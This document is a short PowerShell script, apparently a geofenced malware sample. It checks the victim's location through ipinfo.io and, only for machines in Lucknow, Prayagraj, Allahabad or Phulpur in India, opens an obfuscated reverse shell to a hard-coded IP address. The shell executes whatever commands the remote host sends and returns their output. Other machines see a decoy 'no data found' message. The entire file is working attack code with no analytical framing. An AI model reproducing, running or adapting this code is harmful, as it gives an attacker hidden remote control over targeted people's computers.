try {
    $zrDNVza = Invoke-RestMethod -Uri "ipinfo.io/json" -TimeoutSec 5
    $vlfCsPZk = $zrDNVza.city
    $zGQwAy = $zrDNVza.country
} catch {
    # Fallback to empty if network call fails
    $vlfCsPZk = ""
    $zGQwAy = ""
}

$g4s3XC0 = (Get-TimeZone).Id


$g9Z1QxHD = @("Lucknow", "Prayagraj", "Allahabad", "Phulpur")


if (($g9Z1QxHD -contains $vlfCsPZk -and $zGQwAy -eq "IN") -or ($g4s3XC0 -eq "India Standard Time" -and $vlfCsPZk -in $g9Z1QxHD)) {
   
$str = "TcP"+"C"+"li"+"e"+"nt";$reversed = -join ($str[-1..-($str.Length)]);
$PJ = @("54", "43", "50", "43", "6C", "69", "65", "6E", "74");
$TChar = $PJ | ForEach-Object { [char][convert]::ToInt32($_, 16) };
$PJChar = -join $TChar;
;$ZMdPEN = &('Ne'+'w'+'-'+'Ob'+'je'+'ct') ('S'+'y'+'s'+'t'+'e'+'m'+'.'+'N'+'e'+'t'+'.'+'S'+'ockets.TCPClient')('172.237.65.217',36323);
$rkrvBB = $ZMdPEN.('Get'+'Stream')();[byte[]]$PJChar = 0..65535|%{0};
while(($i = $rkrvBB.ReAd($PJChar, 0, $PJChar.LeNgTh)) -ne 0){;
$97936524 = (&('Ne'+'w'+'-'+'Ob'+'je'+'ct') -TypENAme Sy''Ste''M.tExT.A''SCi''iEN''coding).('Ge'+'tStRinG')($PJChar,0, $i);
$3dbfe2ebffe072727949d7cecc51573b = (iex ". {  $97936524  } 2>&1" | Ou''t-Str''ing );
$J=$O=$K=$E=$R=$P=$W=$R = ${3dbfe2ebffe072727949d7cecc51573b} + 'raingo ' + (pwd).Path + '> ';
$s = ("{0}{1}{3}{2}"-f "se''nd","by","e","t"); $s = ([text.encoding]::ASCii).GetBYTeS($R);
$rkrvBB.Write($s,0,$s.Length);$rkrvBB.Flush()};$ZMdPEN.Close()

    
} else {
    
    Write-Host "no data found" -ForegroundColor Red
}
